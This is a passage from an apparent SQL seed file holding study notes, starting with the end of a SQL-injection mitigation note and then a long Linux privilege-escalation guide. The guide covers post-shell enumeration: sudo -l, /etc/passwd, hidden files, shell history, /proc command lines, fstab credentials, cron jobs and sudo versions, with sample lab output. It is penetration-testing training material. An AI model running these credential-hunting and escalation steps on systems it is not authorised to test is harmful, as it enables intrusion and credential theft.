`mysqli_prepare($conn, $query)` sends the SQL query structure to MySQL **before** any user data is involved. MySQL knows the shape of the query. Then `mysqli_stmt_bind_param($stmt, ''ss'', $username, $password)` binds the user''s values to the `?` placeholders. The `''ss''` means both values are strings. MySQL treats the values as pure data — no matter what characters they contain, they cannot change the query structure.

---

*These notes cover SQL Injection fundamentals from basic concepts through exploitation and mitigation.*', NULL, 'PUBLISHED', 'PUBLIC', 26, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792404006.278), to_timestamp(1792404006.278), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvf57jb2006vida006o2mnv9', 'Linux Privilege Escalation', 'linux-privilege-escalation-8334', 'Complete Linux privilege escalation notes covering environment enumeration, restricted shell escapes, sudo/SUID/capabilities abuse, PATH and wildcard exploitation, cron job hijacking, Docker/LXD/container escapes, shared object hijacking, Python library hijacking, NFS misconfigurations, kernel exploits (DirtyCow, DirtyPipe), Polkit, Netfilter, sudo CVEs, and LD_PRELOAD abuse.', '# Linux Privilege Escalation — Complete Notes

---

## Table of Contents

1. [Environment & Services Enumeration](#part-1-environment--services-enumeration)
2. [Restricted Shells, Sudo, Path, Wildcards, SUID, Capabilities & Privileged Groups](#part-2-restricted-shells-sudo-path-wildcards-suid-capabilities--privileged-groups)
3. [Cron Job Abuse, Containers, Docker, Kubernetes, Logrotate, Miscellaneous Techniques, Python Library Hijacking, Vulnerable Services, Kernel Exploits, Shared Libraries & Shared Object Hijacking](#part-3-cron-job-abuse-containers-docker-kubernetes-logrotate-miscellaneous-techniques-python-library-hijacking-vulnerable-services-kernel-exploits-shared-libraries--shared-object-hijacking)
4. [NFS, Tmux, Kernel Exploits, LD_PRELOAD, Shared Object Hijacking, Python Library Hijacking, Sudo CVEs, Netfilter, Polkit, Dirty Pipe](#part-4-nfs-tmux-kernel-exploits-ld_preload-shared-object-hijacking-python-library-hijacking-sudo-cves-netfilter-polkit-dirty-pipe)

---

# Part 1: Environment & Services Enumeration

---

## Environment Enumeration

Enumeration is the key to privilege escalation. Several helper scripts such as LinPEAS and LinEnum exist to assist with enumeration, but it is equally important to understand what pieces of information to look for and to be able to perform enumeration manually. When you gain initial shell access to a host, there are several key details you must check immediately. The three most critical starting points are the OS version, the kernel version, and the running services. The OS version tells you what distribution you are dealing with and what tools are likely available. The kernel version tells you whether any public kernel exploits apply to this specific machine. Running services reveal what is exposed and whether anything vulnerable is running as root, which is often a direct and easy path to privilege escalation. Always enumerate manually even when automated tools are available — understanding what each command does and what the output means is what makes you effective in environments where tools cannot be transferred.

**OS Version** — Knowing the distribution gives you an idea of what tools are available and what public exploits may exist for that version.

**Kernel Version** — There may be public exploits targeting a specific kernel version. Kernel exploits can cause system instability or a complete crash, so be careful running them against production systems and make sure you fully understand the exploit before running it.

**Running Services** — Services running as root are especially important. A misconfigured or vulnerable root-level service can be an easy win. Known examples include CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4. Flaws have also been found in Exim, Samba, and ProFTPd.

---

## Gaining Situational Awareness

After landing a shell, the very first question to answer is what operating system are we dealing with. If you landed on CentOS or Red Hat, your enumeration approach will differ from landing on a Debian-based system like Ubuntu. Landing on something more obscure like FreeBSD, Solaris, HP-UX, or IBM AIX means the commands themselves may differ, though the underlying principles remain the same. The goal in this phase is to orient yourself as quickly as possible and gather the highest-value information first. Run a few basic commands immediately to understand who you are, where you are, what the machine is named, what network it is in, and whether there is any low-hanging sudo fruit available. Screenshots of this initial information are valuable for client reports as evidence of successful Remote Code Execution and to identify the affected system clearly. Anyone can re-type commands from a cheat sheet, but a deep understanding of what you are looking for and how to obtain it will help you be successful in any environment.

Run these five commands immediately after getting a shell:

```
whoami       — shows what user you are running as
id           — shows UID, GID, and all supplementary group memberships
hostname     — reveals the server name; naming conventions can hint at the machine''s role
ifconfig / ip a  — shows network interfaces and what subnet you landed in
sudo -l      — lists what commands your user can run with sudo; NOPASSWD entries are instant wins
```

---

## Checking OS Version

The /etc/os-release file is the standard and most reliable way to identify the operating system distribution and version on any modern Linux system. This file is present on virtually all current Linux distributions and provides structured key-value information about the OS name, version, version ID, home URL, and codename. Knowing the exact version lets you cross-reference against the vendor''s lifecycle page to determine if the system is still receiving security updates. An out-of-date or end-of-life system is far more likely to be vulnerable to public kernel exploits and known CVEs. For example, Ubuntu 20.04 LTS "Focal Fossa" is supported until April 2030 and is likely well-patched, whereas an EOL system will have no patches applied and may be vulnerable to many known exploits. Always check this regardless of what you assume because patch status is never guaranteed and the customer may have neglected updates on internal systems even while patching internet-facing ones.

```bash
$ cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

---

## Checking PATH and Environment Variables

The PATH variable defines the ordered list of directories the Linux system searches whenever a command is typed without a full absolute path. For example when you type id, the system searches each directory in PATH until it finds /usr/bin/id. If PATH is misconfigured for a privileged user or a SUID binary calls commands using relative paths, it can be abused to hijack command execution and escalate privileges — this is known as PATH hijacking. The env command dumps all currently set environment variables for the current user session. This is worth scanning carefully because developers and administrators sometimes leave sensitive values hardcoded into environment variables such as database passwords, API tokens, or AWS credentials. Always record the PATH and note any unusual or writable directories within it for later analysis when examining SUID binaries and sudo-allowed scripts. Also look for variables like LD_PRELOAD and LD_LIBRARY_PATH which can sometimes be abused when sudo preserves environment variables.

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

$ env
SHELL=/bin/bash
PWD=/home/htb-student
LOGNAME=htb-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/htb-student
LANG=en_US.UTF-8
<SNIP>
```

---

## Checking Kernel Version

The kernel version is one of the most important details to record during enumeration because entire categories of privilege escalation exploits target specific kernel version ranges. Well-known kernel exploits include DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), and PwnKit (CVE-2021-4034), each of which applies only to specific version ranges. The uname -a command prints the full kernel version string including the machine name, kernel release number, build number, date compiled, and CPU architecture. This string is what you search against on exploit-db.com or with searchsploit to find applicable PoCs. The architecture field (x86_64, ARM) is also critical because compiled kernel exploit binaries are architecture-specific and will not run if mismatched. An alternative way to get the same information is cat /proc/version. Always note down the full kernel string and search for it even if the OS appears patched — internal systems are often neglected.

```bash
$ uname -a
Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

$ cat /proc/version
Linux version 5.4.0-122-generic (buildd@lcy02-amd64-059) ...
```

---

## Checking CPU Information

The lscpu command provides detailed information about the CPU architecture and hardware environment. The most immediately relevant fields are the architecture (x86_64, ARM, MIPS), the number of CPUs, the vendor, and the hypervisor vendor. Knowing the architecture is essential because compiled exploit binaries must match the target architecture exactly or they will fail to execute. The hypervisor vendor field tells you whether you are inside a virtual machine such as VMware, KVM, or Hyper-V, which is useful context for understanding the environment and can affect certain exploit compatibility. The CPU count can suggest whether you are on a shared hosting environment where timing-based attacks might be less reliable. While CPU information does not directly give you a privilege escalation vector it is essential context for compiling, transferring, and executing exploit payloads correctly on the target system. This information also goes into the penetration test report to document the assessed system''s hardware profile.

```bash
$ lscpu

Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
CPU(s):                          2
Vendor ID:                       AuthenticAMD
Model name:                      AMD EPYC 7302P 16-Core Processor
Hypervisor vendor:               VMware
<SNIP>
```

---

## Checking Login Shells

The /etc/shells file lists all valid login shells registered on the system. This matters for privilege escalation because outdated shell versions carry known vulnerabilities — Bash versions older than 4.3 are vulnerable to the Shellshock exploit (CVE-2014-6271), which allows code execution via crafted environment variables. Beyond shell versions, the presence of terminal multiplexers like tmux and screen listed as valid shells indicates they are installed and available on the system. If another user, particularly a privileged one, has an active tmux or screen session running, and you can access the socket, you can attach to their session and inherit their privileges entirely. Restricted shells like rbash can sometimes be escaped using known techniques. Users whose shell is set to /usr/sbin/nologin or /bin/false cannot log in interactively, which is important to know when planning lateral movement attempts between accounts.

```bash
$ cat /etc/shells

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
```

---

## Checking Security Defenses

Before attempting any privilege escalation techniques it is important to determine what security controls are in place on the target system. This prevents wasting time on techniques that will be blocked and helps avoid triggering alerts from monitoring systems. The key defenses to check for are Exec Shield, iptables, AppArmor, SELinux, Fail2ban, Snort, and UFW (Uncomplicated Firewall). AppArmor and SELinux are mandatory access control frameworks that enforce per-process security policies and can block even root-level actions if their profiles are set to enforcing mode. Fail2ban monitors authentication logs and bans IPs after repeated failures — important to know before attempting any brute force against local services. Snort is an intrusion detection system that may alert on aggressive scanning or exploit attempts. Most of the time you will not have read access to the full configurations of these defenses, but simply knowing they exist shapes your attack strategy significantly and tells you what to avoid.

Things to look for:

```
Exec Shield
iptables
AppArmor
SELinux
Fail2ban
Snort
Uncomplicated Firewall (ufw)
```

---

## Checking Drives and Block Devices

The lsblk command enumerates all block devices attached to the system including hard disks, USB drives, and optical drives, along with their sizes, types, and whether they are currently mounted. Unmounted partitions are particularly interesting because they may contain backup data, old configuration files, sensitive documents, or even a separate /etc directory with its own shadow file that you can read. If you can mount an unmounted partition and read its contents you may find credentials or other material useful for privilege escalation. The lpstat command checks for any printers attached to the system and any active or queued print jobs, which can occasionally reveal sensitive printed documents. You should also check /etc/fstab carefully for NFS or SMB mount entries that include credentials hardcoded directly in the options field, which administrators sometimes do for convenience and automation purposes.

```bash
$ lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
sda                         8:0    0   20G  0 disk
├─sda1                      8:1    0    1M  0 part
├─sda2                      8:2    0    1G  0 part /boot
└─sda3                      8:3    0   19G  0 part
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
sr0                        11:0    1  908M  0 rom
```

---

## Checking /etc/fstab

The /etc/fstab file defines all filesystem mount points configured to mount automatically at boot. This file is readable by all users and is worth examining closely for two reasons. First, administrators sometimes embed credentials directly into mount options for NFS or SMB shares, making them visible to any user who can read the file. Searching for keywords like password, username, and credential within this file using grep can quickly surface any such secrets. Second, the file reveals what filesystems exist on the system that are not currently mounted — these are candidates for manual mounting to explore their contents for sensitive data. Use cat /etc/fstab | grep -v "#" | column -t to view only the active entries in a clean readable format and identify any unmounted filesystems worth investigating further with manual mounting.

```bash
$ cat /etc/fstab

/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4... / ext4 defaults 0 0
/dev/disk/by-uuid/20b1770d-a233-4780... /boot ext4 defaults 0 0

$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-...  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0     /boot/efi  vfat  umask=0077         0  1
/swapfile          none       swap  sw                 0  0
```

---

## Checking Routing Table and ARP Cache

The routing table reveals what other networks are reachable from the compromised host through which interface. This is critical for identifying internal subnets that were not visible during external reconnaissance and that can be reached via pivoting tools like Chisel, SSHuttle, or Ligolo-ng. The route or netstat -rn commands display the kernel IP routing table. Any non-default route entry pointing to an internal subnet is a pivot target. The ARP cache (arp -a) shows IP-to-MAC address mappings for hosts the target has recently communicated with — these are your most immediately reachable pivot targets because they are actively used systems in the same network segment. In a domain environment, always check /etc/resolv.conf — if it points to an internal DNS server IP you are almost certainly dealing with an Active Directory environment and AD enumeration should follow.

```bash
$ route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192

$ netstat -rn

$ arp -a
_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192

$ cat /etc/resolv.conf
```

---

## User Enumeration via /etc/passwd

The /etc/passwd file stores information about every user account on the system and is readable by all users. Each line contains seven colon-separated fields: username, password placeholder, UID, GID, GECOS comment field, home directory, and login shell. Reading this file tells you every account that exists, what their UIDs are (UIDs below 1000 are typically system accounts), what home directories they have, and what shell they use. Users with /usr/sbin/nologin or /bin/false as their shell cannot log in interactively. On older or embedded systems the password field may contain an actual hash instead of x, which is directly crackable offline. The command grep "sh$" /etc/passwd filters to only users who have an actual login shell, narrowing down which accounts are worth targeting for lateral movement or credential reuse attacks.

```bash
$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
htb-student:x:1008:1008::/home/htb-student:/bin/bash
<SNIP>

$ cat /etc/passwd | cut -f1 -d:

root
daemon
mrb3n
htb-student
<SNIP>

$ grep "sh$" /etc/passwd

root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
htb-student:x:1008:1008::/home/htb-student:/bin/bash
```

**Password Hash Algorithm Reference:**

```
$1$...       — Salted MD5
$5$...       — SHA-256
$6$...       — SHA-512
$2a$...      — BCrypt
$7$...       — Scrypt
$argon2i$... — Argon2
```

---

## Existing Groups — Checking /etc/group

The /etc/group file lists every group on the system along with its GID and member usernames. Group membership is one of the most important privilege escalation vectors on Linux because certain groups grant near-immediate root access through completely different mechanisms. The sudo group allows members to run commands as root. The docker group allows mounting the host root filesystem into a container. The lxd group allows creating privileged containers with the same effect. The disk group allows direct read access to block devices meaning you can read /etc/shadow straight off disk without going through filesystem permissions. The adm group gives read access to system log files which may contain credentials or session tokens. Use getent group <groupname> to query group membership, which is more reliable than parsing /etc/group directly on systems using LDAP or NIS for authentication.

```bash
$ cat /etc/group

root:x:0:
adm:x:4:syslog,htb-student
sudo:x:27:mrb3n,htb-student
docker:x:999:
lxd:x:998:
<SNIP>

$ getent group sudo
sudo:x:27:mrb3n
```

---

## Checking Home Directories

The /home directory contains subdirectories for each non-system user who has been created on the system. Enumerating each home directory is valuable because users frequently store sensitive data, credentials, and private keys in their home folders without applying appropriate file permissions. The most valuable files to look for are .bash_history which may contain passwords passed as CLI arguments, .ssh/id_rsa for SSH private keys, .ssh/authorized_keys which shows what keys can authenticate to that account, and application configuration files that store hardcoded credentials. If SSH keys are found always cross-reference them against the ARP cache and any internal hostnames discovered to identify where those keys can be used. Finding any credentials anywhere should trigger an immediate attempt to reuse them across all user accounts — password reuse is extremely common in real-world environments.

```bash
$ ls /home

administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
backupsvc                cliff.moore  logger       shared
```

---

## Mounted File Systems

The df -h command shows all currently mounted filesystems along with their sizes, used space, available space, and mount points. Mounted filesystems beyond the standard system directories — for example large /opt, /srv, or /data mounts — often contain application data, backup archives, or configuration files worth examining closely. Different filesystem types such as ext4, NTFS, and FAT32 can all be mounted on Linux with appropriate drivers. File systems that can be read and written to by the user are called read/write filesystems. Mounting a filesystem allows the user to access the files and folders stored on it. In order to mount a filesystem the user must have root privileges, which means that if you can escalate to root you unlock access to any unmounted filesystem on the system. Always check what is mounted and what its permissions are.

```bash
$ df -h

Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           389M  1.8M  388M   1% /run
/dev/sda5        20G  7.9G   11G  44% /
tmpfs           1.9G     0  1.9G   0% /dev/shm
/dev/sda1       511M  4.0K  511M   1% /boot/efi
/dev/sr0        3.6G  3.6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64
<SNIP>
```

---

## Unmounted File Systems

When a filesystem is unmounted it is no longer accessible by the system and its contents are invisible to normal users. Administrators sometimes intentionally leave filesystems unmounted to prevent standard users from viewing files, scripts, documents, and other sensitive information stored there. If you can extend your privileges to the root user you can mount and read these filesystems freely. Unmounted filesystems are identified by looking at /etc/fstab entries that do not have a corresponding active mount in the df output. These are prime targets once root is achieved as they may contain backup data, historical configs, or other sensitive material that the admin assumed was safely hidden by keeping it unmounted. Always compare df -h output against /etc/fstab to spot the difference.

```bash
$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
/swapfile                                  none       swap  sw                 0  0
```

---

## All Hidden Files

Linux hides files and directories whose names begin with a dot from standard ls output. These hidden files frequently contain sensitive configuration, session data, and credentials that are not immediately visible to a casual observer. The most valuable hidden files to locate are .bash_history for command history, .ssh/ directory for SSH keys, .netrc for FTP and HTTP credentials in plaintext, .gitconfig for git tokens and usernames, .aws/credentials for AWS access keys, and various application config directories stored under .config/. The find command with the -name ".*" pattern locates all hidden files recursively across the filesystem. The 2>/dev/null at the end suppresses permission denied errors from directories you cannot read, keeping the output clean and focused on results you can actually access and use.

```bash
$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
-rw-rw-r-- 1 htb-student htb-student  180 Nov 27 11:36 /home/htb-student/.wget-hsts
-rw------- 1 htb-student htb-student  387 Nov 27 14:02 /home/htb-student/.bash_history
-rw-r--r-- 1 htb-student htb-student  807 Nov 27 11:16 /home/htb-student/.profile
-rw-r--r-- 1 htb-student htb-student    0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
-rw-r--r-- 1 htb-student htb-student  220 Nov 27 11:16 /home/htb-student/.bash_logout
-rw-rw-r-- 1 htb-student htb-student  162 Nov 28 13:26 /home/htb-student/.notes
```

---

## All Hidden Directories

Just like hidden files, hidden directories beginning with a dot are not shown by ls without the -a flag and are frequently used to store application data, SSH keys, GPG keyrings, cache directories, and other sensitive runtime data. The .ssh/ directory is the most valuable — it contains private keys, known_hosts, and authorized_keys. The .gnupg/ directory stores GPG keys which may be used to decrypt encrypted files found elsewhere on the system. The .cache/ and .config/ directories contain application-specific data and configs that often include session tokens and credentials. The find / -type d -name ".*" -ls command lists all hidden directories with their permissions, owner, size, and modification timestamps, which helps prioritise which directories to investigate first based on recency and ownership.

```bash
$ find / -type d -name ".*" -ls 2>/dev/null

684822  4 drwx------ 3 htb-student htb-student 4096 Nov 28 12:32 /home/htb-student/.gnupg
790793  4 drwx------ 2 htb-student htb-student 4096 Oct 27 11:31 /home/htb-student/.ssh
684804  4 drwx------ 10 htb-student htb-student 4096 Oct 27 11:30 /home/htb-student/.cache
790827  4 drwxrwxr-x 8 htb-student htb-student 4096 Oct 27 11:32 /home/htb-student/CVE-2021-3156/.git
684796  4 drwx------ 10 htb-student htb-student 4096 Oct 27 11:30 /home/htb-student/.config
280101  4 drwxrwxrwt 2 root        root        4096 Nov 28 12:31 /tmp/.font-unix
262364  4 drwxrwxrwt 2 root        root        4096 Nov 28 12:32 /tmp/.ICE-unix
```

---

## Temporary Files

Linux has three main temporary file directories that are visible and readable by all users on the system: /tmp, /var/tmp, and /dev/shm. The key distinction between them is data retention time. Files in /tmp are automatically deleted after ten days and are also wiped entirely on system reboot — making them suitable only for truly short-lived temporary data. Files in /var/tmp persist for up to 30 days and survive reboots, meaning they are used by programs that need to retain temporary data between sessions. This makes /var/tmp significantly more likely to contain meaningful artifacts from cron jobs, backup scripts, or other automated processes. The /dev/shm directory is a RAM-based tmpfs used by processes for inter-process communication and may contain sensitive runtime data written by applications. Always check all three.

```bash
$ ls -l /tmp /var/tmp /dev/shm

/dev/shm:
total 0

/tmp:
total 52
-rw------- 1 htb-student htb-student    0 Nov 28 12:32 config-err-v8LfEU
drwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store
drwx------ 2 htb-student htb-student 4096 Nov 28 12:32 ssh-OKlLKjlc98xh
<SNIP>

/var/tmp:
total 28
drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
```

---

## Linux Services and Internals Enumeration

After completing the basic environment enumeration the next phase is to dig deeper into the internals of the host. This means looking at the internal configuration and way of working including services, applications, scheduled tasks, network connections, user activity, history files, and what tools are available. The questions to answer in this phase include: what services and applications are installed, what services are currently running, what sockets are in use, who is currently logged in and who has logged in recently, what password policies are enforced, whether the host is domain-joined, what interesting information exists in history and log files, what files have been modified recently, whether there are cron jobs that can be hijacked, and what useful tools like netcat, python, perl, gcc, and nmap are present. Each of these answers either points directly to a privilege escalation vector or informs how you will deliver and execute your payload.

---

## Network Interfaces

The ip a command displays all network interfaces on the system along with their assigned IP addresses, subnet masks, broadcast addresses, and states. This is more reliable than ifconfig on modern systems because ifconfig requires the net-tools package which is not always installed. The primary reason to run this command is to discover additional network interfaces beyond the one you came in through. A host with multiple NICs is connected to multiple subnets, which means it can serve as a pivot point into internal network segments completely unreachable from your attack machine. The loopback interface at 127.0.0.1 is always present and any services listening only on loopback are invisible from outside — these are worth probing locally once on the machine. IPv6 addresses should also be noted as some services listen only on IPv6 and may not appear in IPv4 scans.

```bash
$ ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host

2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192
    inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic
    inet6 fe80::250:56ff:feb9:ed2a/64 scope link
```

---

## Hosts File

The /etc/hosts file is a static local DNS table that maps hostnames to IP addresses directly on the local machine, bypassing any DNS server lookup. This file is valuable during enumeration because administrators frequently add internal hostnames for systems that are not in public DNS — internal application servers, database servers, domain controllers, and development systems. Finding internal hostnames in this file reveals the existence of other systems in the environment that you can attempt to reach and pivot to. If the host is part of an Active Directory domain, the domain name and DC hostname may appear here. Any hostname that resolves to a private IP range is a potential lateral movement target. Always cross-reference these hostnames with any SSH keys or credentials you have already discovered.

```bash
$ cat /etc/hosts

127.0.0.1   localhost
127.0.1.1   nixlpe02
::1         ip6-localhost ip6-loopback
fe00::0     ip6-localnet
ff00::0     ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
```

---

## User''s Last Login

The lastlog command reads from /var/log/lastlog and displays the most recent login time for every user account on the system, along with the port and source IP they connected from. This tells you which accounts are actively used and which have never been logged into. Actively used accounts especially those that have logged in recently from external IPs are worth prioritising for lateral movement because they are more likely to have useful history files, cached credentials, and active sessions worth examining. Accounts that have never logged in are typically service accounts that usually cannot be interactively accessed, but they may still own files or run processes worth examining. The login source IP also reveals what other machines in the network administrators use to connect to this system, giving you additional pivot targets.

```bash
$ lastlog

Username         Port     From             Latest
root                                       **Never logged in**
mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022
cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022
stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022
htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022
```

---

## Logged In Users

The w command shows who is currently logged into the system, what terminal they are on, where they connected from, when they logged in, how long they have been idle, and what command they are currently running. This is important for operational security — if another user is active on the system while you are enumerating your actions may be visible to them or trigger monitoring alerts. More importantly seeing a privileged user currently logged in may present an opportunity: if they have an active tmux or screen session you can attach to, or if their running command reveals something interesting about what they are doing on the system. The who command and the finger command serve a similar purpose on systems where they are available and installed.

```bash
$ w

 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
```

---

## Command History

The history command displays the command history for the current shell session read from the .bash_history file. This is one of the highest-value files to examine during privilege escalation because users frequently pass credentials directly on the command line — database connection strings with passwords, SSH commands, curl commands with Basic Auth headers, git clone commands with tokens embedded in URLs, and similar patterns are all common. Even without explicit credentials the history reveals what the user has been doing on the system: what servers they SSH into, what scripts they run, what databases they access, and what cron or backup tasks they manage. Always check .bash_history for every user whose home directory you can read, not just your own current user''s history.

```bash
$ history

    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

---

## Finding History Files

Beyond the standard .bash_history file, some scripts and programs create their own custom history files to monitor user activity or log executed commands. These can exist anywhere on the filesystem and may be named with patterns like _hist or _history. Finding these custom history files can reveal commands and credentials from processes and scripts that are not captured in the standard shell history. The find command with a pattern match for *_hist and *_history will locate all such files across the filesystem. These are particularly valuable when you find history files belonging to other users or to root because they may reveal the exact commands used to set up services, configure credentials, or perform administrative tasks on the system.

```bash
$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
```

---

## Cron Jobs

Cron jobs are scheduled tasks on Linux systems equivalent to Windows scheduled tasks. They are commonly set up to perform maintenance, backup, and monitoring tasks on a regular schedule. They are configured in /etc/crontab, in per-user crontabs via crontab -l, and in the /etc/cron.daily/, /etc/cron.weekly/, /etc/cron.hourly/, and /etc/cron.monthly/ directories. Cron jobs running as root are particularly interesting because if the script they execute has weak permissions — a world-writable script or a script in a world-writable directory — you can modify it and have your payload execute the next time the cron job runs. Relative path usage in cron scripts is also exploitable via PATH hijacking. Even if the scripts are not directly writable, understanding what automated tasks run on the system provides context about backup processes and monitoring jobs.

```bash
$ ls -la /etc/cron.daily/

total 48
drwxr-xr-x  2 root root 4096 Aug  2 17:36 .
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common
```

---

## Proc Filesystem

The proc filesystem /proc is a virtual filesystem dynamically generated by the Linux kernel that exposes real-time information about every running process, hardware state, kernel parameters, and system memory. It does not exist on disk but is generated in memory and reflects the live state of the system at any moment. From a privilege escalation perspective /proc is valuable because each running process has a directory under /proc/<PID>/ containing files like cmdline which holds the full command line the process was started with including all arguments, environ which holds the process''s environment variables, and fd/ which lists open file descriptors. Reading these can reveal credentials passed as command-line arguments or environment variables to other processes including those running as root, which may include database passwords or authentication tokens.

```bash
$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

/sbin/init
/usr/lib/packagekit/packagekitd
root@10.129.14.200
ssh
htb-student
[priv]sshd:
htb-student@pts/2
<SNIP>
```

---

## Installed Packages

Knowing what software packages are installed on the system is important because any installed package that is outdated or poorly configured is a potential privilege escalation vector. Older versions of common tools and services regularly have public CVEs with available PoC exploits available on exploit-db and in searchsploit. On Debian-based systems apt list --installed produces the full list of installed packages with their version numbers. This list should be saved to a file for further analysis. You can then compare this list against vulnerability databases manually or using automation. The output is piped through tr, cut, and sed to clean it into a usable format of package name and version that can be grepped, searched, and compared. Older Linux systems have a higher likelihood of having vulnerable packages installed especially if they have not been updated recently.

```bash
$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed ''s/[0-9]://g'' | tee -a installed_pkgs.list

accountsservice 0.6.55-0ubuntu12~20.04.5
acl 2.2.53-6
apparmor 2.13.3-7ubuntu5.1
anacron 2.3-29
apg 2.2.3.dfsg.1-5
<SNIP>
```

---

## Sudo Version

Checking the exact version of sudo installed on the system is critical because sudo itself has historically been vulnerable to several serious local privilege escalation exploits. The most well-known is Baron Samedit (CVE-2021-3156), which affected sudo versions before 1.9.5p2 and allowed any local user to gain root privileges through a heap-based buffer overflow. Other sudo vulnerabilities have affected different version ranges over the years. The sudo -V command prints not only the sudo version but also the sudoers policy plugin version and file grammar version. Any version of sudo below 1.9.5p2 should be immediately cross-checked against CVE databases. Even on patched versions, the sudoers configuration itself may contain dangerous misconfigurations discoverable via sudo -l that allow privilege escalation without needing any exploit at all.

```bash
$ sudo -V

Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

---

## Binaries

Beyond packaged software, compiled binaries can be dropped directly onto a system in /bin, /usr/bin/, or /usr/sbin/ without going through a package manager, leaving no package installation record. Listing the contents of these directories reveals all available executables on the system. Some of these binaries may have SUID bits set allowing them to run as root regardless of who executes them. Others may simply be powerful tools that can be leveraged to read restricted files, write to privileged locations, or spawn elevated shells if misconfigured. The strace tool is particularly useful for analyzing how a specific binary behaves at the system call level — it traces every syscall the program makes including file opens, network connections, and credential reads, potentially revealing hardcoded passwords or tokens being passed during normal execution.

```bash
$ ls -l /bin /usr/bin/ /usr/sbin/

lrwxrwxrwx 1 root root 7 Oct 27 11:14 /bin -> usr/bin

/usr/bin/:
-rwxr-xr-x 1 root root 31248 May 19 2020 aa-enabled
